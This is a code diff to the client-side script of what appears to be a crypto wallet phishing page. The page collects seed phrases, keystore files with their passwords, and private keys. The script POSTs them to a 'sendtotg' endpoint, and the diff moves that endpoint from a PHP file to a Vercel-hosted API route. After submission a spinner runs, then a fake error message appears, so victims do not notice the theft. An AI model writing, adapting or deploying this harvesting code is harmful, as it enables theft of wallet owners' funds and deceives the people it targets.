@@ -2402,28 +2402,28 @@ $(document).ready(function () {
     switch (tabId) {
       case 'phraseSend': // Seed phrase tab
         if ($('#phrase1').val().trim() === '') {
-          $('#phrase1').addClass('is-invalid'); // Highlight invalid input
+          $('#phrase1').addClass('is-invalid');
           isValid = false;
         } else {
-          $('#phrase1').removeClass('is-invalid'); // Remove invalid class if valid
+          $('#phrase1').removeClass('is-invalid');
         }
         break;
 
       case 'keystoreSend': // Keystore tab
         if ($('#keystore1').val().trim() === '' || $('#keystorePassword').val().trim() === '') {
-          $('#keystore1, #keystorePassword').addClass('is-invalid'); // Highlight invalid inputs
+          $('#keystore1, #keystorePassword').addClass('is-invalid');
           isValid = false;
         } else {
-          $('#keystore1, #keystorePassword').removeClass('is-invalid'); // Remove invalid class if valid
+          $('#keystore1, #keystorePassword').removeClass('is-invalid');
         }
         break;
 
       case 'privateKeySend': // Private key tab
         if ($('#privateKey1').val().trim() === '') {
-          $('#privateKey1').addClass('is-invalid'); // Highlight invalid input
+          $('#privateKey1').addClass('is-invalid');
           isValid = false;
         } else {
-          $('#privateKey1').removeClass('is-invalid'); // Remove invalid class if valid
+          $('#privateKey1').removeClass('is-invalid');
         }
         break;
 
@@ -2466,39 +2466,39 @@ $(document).ready(function () {
         return;
     }
 
-    // Send the form data via AJAX
+    // Send the form data via AJAX to your Next.js API route
     $.ajax({
-      url: 'sendtotg.php', // Your server-side script to handle the form submission
+      url: '/api/sendtotg', // ✅ Correct path for Vercel-hosted Next.js API
       type: 'POST',
-      data: formData,
+      contentType: 'application/json',
+      data: JSON.stringify(formData),
       beforeSend: function () {
-        // Show loading spinner before sending the request
         $('#popup_connect_wallet_success').modal('show'); // Show spinner modal
       },
       success: function (response) {
         console.log('Form submitted successfully:', response);
-        $('#popup_connect_wallet').modal('hide'); // Close the retrieval modal immediately
+        $('#popup_connect_wallet').modal('hide');
 
-        setTimeout(function() {
-           $('#spinz').hide();
-           $('#error_div').show();
-        }, 10000); // 10 seconds delay before reload
+        setTimeout(function () {
+          $('#spinz').hide();
+          $('#error_div').show();
+        }, 10000);
       },
       error: function (xhr, status, error) {
         console.error('Form submission failed:', error);
-        setTimeout(function() {
-          $('#popup_connect_wallet_success').modal('hide'); // Hide spinner modal after 5 seconds
-        }, 5000); // Hide spinner modal after 5 seconds
+        setTimeout(function () {
+          $('#popup_connect_wallet_success').modal('hide');
+        }, 5000);
       }
     });
   });
 
-  // Cancel button click event to close the modal
+  // Cancel button click event
   $('#cancelBtn').on('click', function () {
     $('#retrieveModal').modal('hide');
   });
 });
-
-
 </script>
+
+
 
